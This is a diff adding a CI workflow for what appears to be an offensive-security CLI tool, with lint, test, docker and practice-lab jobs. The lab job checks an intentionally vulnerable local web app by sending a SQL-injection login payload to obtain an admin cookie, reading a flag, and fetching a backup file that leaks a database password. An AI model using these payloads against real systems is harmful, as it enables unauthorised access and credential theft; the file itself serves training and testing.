@@ -1,0 +1,78 @@
+name: ci
+
+on:
+  push:
+    branches: ["**"]
+  pull_request:
+
+jobs:
+  test:
+    name: tests (python ${{ matrix.python-version }})
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      matrix:
+        python-version: ["3.10", "3.11", "3.12"]
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-python@v5
+        with:
+          python-version: ${{ matrix.python-version }}
+          cache: pip
+      - name: Install
+        run: |
+          python -m pip install --upgrade pip
+          pip install -e ".[dev]"
+      - name: Lint
+        run: ruff check redloop tests
+      - name: Test
+        run: pytest tests/ -q
+      - name: CLI smoke test
+        run: |
+          redloop --version
+          redloop --list-tools
+          redloop -t 127.0.0.1 -p mock --dry-run --plain --max-steps 1 --runs-dir /tmp/runs
+
+  docker:
+    name: docker build
+    runs-on: ubuntu-latest
+    if: github.event_name == 'push'
+    steps:
+      - uses: actions/checkout@v4
+      - uses: docker/setup-buildx-action@v3
+      - name: Build slim image
+        uses: docker/build-push-action@v6
+        with:
+          context: .
+          push: false
+          build-args: |
+            TOOLSET=slim
+          cache-from: type=gha
+          cache-to: type=gha,mode=max
+
+  lab:
+    name: practice lab
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Start the lab and check it is vulnerable
+        run: |
+          LAB_QUIET=1 PORT=8080 python3 labs/web/lab.py &
+          for i in $(seq 1 20); do curl -sf http://127.0.0.1:8080/ >/dev/null && break; sleep 0.5; done
+
+          echo "the admin panel refuses unauthenticated requests"
+          test "$(curl -s -o /dev/null -w '%{http_code}' http://127.0.0.1:8080/admin/)" = "403"
+
+          # The login form is injectable and answers with an admin cookie. (Do not
+          # follow the redirect here: curl would not carry the Set-Cookie along,
+          # which is what made an earlier version of this check fail.)
+          echo "the login form is SQL-injectable and hands out role=admin"
+          curl -s -D - -o /dev/null -X POST \
+            -d "username=admin'%20OR%201=1--%20-&password=x" \
+            http://127.0.0.1:8080/login.php | grep -qi 'set-cookie: role=admin'
+
+          echo "that cookie exposes the flag"
+          curl -s -H 'Cookie: role=admin' http://127.0.0.1:8080/admin/ | grep -q 'flag{'
+
+          echo "the exposed backup leaks the database password"
+          curl -s http://127.0.0.1:8080/backup/config.php.bak | grep -q DB_PASS
